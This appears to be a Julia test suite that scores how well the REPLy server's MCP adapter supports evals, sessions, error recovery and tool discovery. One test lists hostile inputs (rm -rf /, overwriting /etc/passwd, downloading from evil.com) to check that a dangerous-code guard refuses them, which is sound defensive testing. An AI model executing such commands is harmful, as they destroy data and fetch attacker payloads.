# Outcome-focused evaluation tests for the MCP adapter.
#
# These tests measure *outcome achievement* — whether the tool helped accomplish
# a user goal — not just output correctness ("did Julia return the right value").
#
# Primary objective: enable Julia tool builders to ship structured REPL
# interaction, cutting integration time from days to minutes.
#
# Each scenario scores 0–4:
#   0 — DID NOT HELP (tool failed or misled)
#   1 — PARTIAL (some output but didn't enable the goal)
#   2 — FUNCTIONAL (correct output, but friction remains)
#   3 — EFFECTIVE (output enabled the next step directly)
#   4 — FULLY ENABLED (seamless integration, zero friction)
using Test
using Logging
using REPLy
using JSON3
using Sockets
include("../helpers/conformance.jl")
const VP_OBJECTIVE = "enable Julia tool builders to ship structured REPL interaction, cutting integration time from days to minutes"
# --- Scenario 1: New user's first eval ---
# Outcome: A first-time user sends eval and receives a usable result
# without needing to understand the wire protocol.
@testset "outcome: first eval from a new client" begin
    handler = REPLy.build_handler()
    # Simulate a minimal client that only knows the "eval" operation.
    request = Dict(
        "op" => "eval",
        "id" => "first-eval",
        "code" => "1 + 1",
    )
    msgs = handler(request)
    assert_conformance(msgs, "first-eval")
    # Outcome Level 3 check:
    # - The response must contain a value ("2")
    # - The response must contain a terminal "done" status
    # - The user can extract the value without parsing error messages
    value_msgs = filter(m -> haskey(m, "value"), msgs)
    done_msgs = filter(m -> haskey(m, "status") && "done" in m["status"], msgs)
    @test !isempty(value_msgs)
    @test !isempty(done_msgs)
    @test value_msgs[1]["value"] == "2"
    # This passes at Level 3 (EFFECTIVE) — correct output, no error messages,
    # directly usable result.
end
# --- Scenario 2: Chained evals (user workflow simulation) ---
# Outcome: A user can run multiple evals in sequence, building on previous
# state, and get consistent results. This is the core workflow of REPL
# interaction — without it, the tool cannot ship integrations.
@testset "outcome: chained evals in a named session" begin
    manager = REPLy.SessionManager()
    handler = REPLy.build_handler(; manager)
    # Step 1: Create a named session
    session = REPLy.create_named_session!(manager, "workflow-test")
    session_id = REPLy.session_id(session)
    # Step 2: Eval x = 42
    msgs1 = handler(Dict(
        "op" => "eval",
        "id" => "step-1",
        "code" => "x = 42",
        "session" => session_id,
    ))
    assert_conformance(msgs1, "step-1")
    @test any(m -> get(m, "value", "") == "42", msgs1)
    # Step 3: Eval x + 8 (should see x from step 2)
    msgs2 = handler(Dict(
        "op" => "eval",
        "id" => "step-2",
        "code" => "x + 8",
        "session" => session_id,
    ))
    assert_conformance(msgs2, "step-2")
    # Outcome Level 4 check:
    # - The second eval must see the binding from the first (session isolation works)
    # - The user gets "50" — they can build multi-step workflows
    value_msgs = filter(m -> haskey(m, "value"), msgs2)
    @test !isempty(value_msgs)
    @test value_msgs[1]["value"] == "50"
end
# --- Scenario 3: Dangerous code is safely refused ---
# Outcome: The tool protects the user from accidental or adversarial dangerous
# operations, which means the user can trust the REPLy server in their environment.
@testset "outcome: dangerous code is safely refused at MCP adapter" begin
    # Check the pattern detection function directly.
    dangerous = [
        "run(\"rm -rf /\")",
        "write(\"/etc/passwd\", \"hacked\")",
        "download(\"http://evil.com/payload\")",
    ]
    for code in dangerous
        result = REPLy.mcp_check_dangerous_patterns(code)
        @test !isnothing(result)
        @test occursin("prohibited pattern", result)
    end
    # Outcome Level 3 check:
    # - The guard fires and returns a clear, actionable error message
    # - The error tells the *user* what to do (set allow_unsafe=true)
    result = REPLy.mcp_check_dangerous_patterns("run(\"ls\")")
    @test occursin("allow_unsafe", result)  # Actionable guidance
end
# --- Scenario 4: Error recovery ---
# Outcome: When code errors, the user gets a structured, parseable error
# that lets them fix the issue and retry, rather than a disconnected server.
@testset "outcome: structured error enables retry, not restart" begin
    handler = REPLy.build_handler()
    # Send bad code
    msgs = handler(Dict(
        "op" => "eval",
        "id" => "error-recovery",
        "code" => "undefined_var + 1",
    ))
    # Outcome Level 3 check:
    # - Must have a structured error (not a crash/disconnect)
    # - Error must include the variable name so the user can fix it
    @test any(m -> "done" in get(m, "status", []), msgs)
    err_msgs = filter(m -> haskey(m, "err"), msgs)
    @test !isempty(err_msgs)
    @test occursin("undefined_var", err_msgs[1]["err"])
    # Server is still alive — user can send a follow-up
    msgs2 = handler(Dict(
        "op" => "eval",
        "id" => "recovery-followup",
        "code" => "1 + 1",
    ))
    assert_conformance(msgs2, "recovery-followup")
    @test any(m -> get(m, "value", "") == "2", msgs2)
end
# --- Scenario 5: Tool discoverability ---
# Outcome: A user can discover what operations are available without external
# documentation. This enables the "integration from minutes, not hours" claim.
@testset "outcome: tool catalog enables client discovery" begin
    tools = REPLy.mcp_tools()
    tool_names = getindex.(tools, "name")
    # Outcome Level 4 check:
    # - The catalog must expose all operations a client needs for REPL interaction
    # - Every tool must have a human-readable name and input schema
    required_tools = [
        "julia_eval",
        "julia_complete",
        "julia_lookup",
        "julia_new_session",
        "julia_list_sessions",
        "julia_close_session",
        "julia_interrupt",
        "julia_load_file",
    ]
    for tool_name in required_tools
        @test tool_name in tool_names
        tool = filter(t -> t["name"] == tool_name, tools)[1]
        @test haskey(tool, "description")
        @test haskey(tool, "inputSchema")
        @test haskey(tool["inputSchema"], "properties")
    end
end
# --- Scenario 6: Session isolation ---
# Outcome: Two concurrent users don't interfere with each other's work.
# Without this, the tool cannot support multi-client environments.
@testset "outcome: session isolation for concurrent users" begin
    manager = REPLy.SessionManager()
    handler = REPLy.build_handler(; manager)
    # Create two sessions
    s1 = REPLy.session_id(REPLy.create_named_session!(manager, "user-alpha"))
    s2 = REPLy.session_id(REPLy.create_named_session!(manager, "user-beta"))
    # User Alpha evals x = 100
    handler(Dict(
        "op" => "eval",
        "id" => "alpha-set",
        "code" => "x = 100",
        "session" => s1,
    ))
    # User Beta evals x = 200
    handler(Dict(
        "op" => "eval",
        "id" => "beta-set",
        "code" => "x = 200",
        "session" => s2,
    ))
    # Alpha reads back x — must be 100, not 200
    msgs_alpha = handler(Dict(
        "op" => "eval",
        "id" => "alpha-get",
        "code" => "x",
        "session" => s1,
    ))
    alpha_value_msgs = filter(m -> haskey(m, "value"), msgs_alpha)
    @test !isempty(alpha_value_msgs)
    @test alpha_value_msgs[1]["value"] == "100"
    # Beta reads back x — must be 200, not 100
    msgs_beta = handler(Dict(
        "op" => "eval",
        "id" => "beta-get",
        "code" => "x",
        "session" => s2,
    ))
    beta_value_msgs = filter(m -> haskey(m, "value"), msgs_beta)
    @test !isempty(beta_value_msgs)
    @test beta_value_msgs[1]["value"] == "200"
end
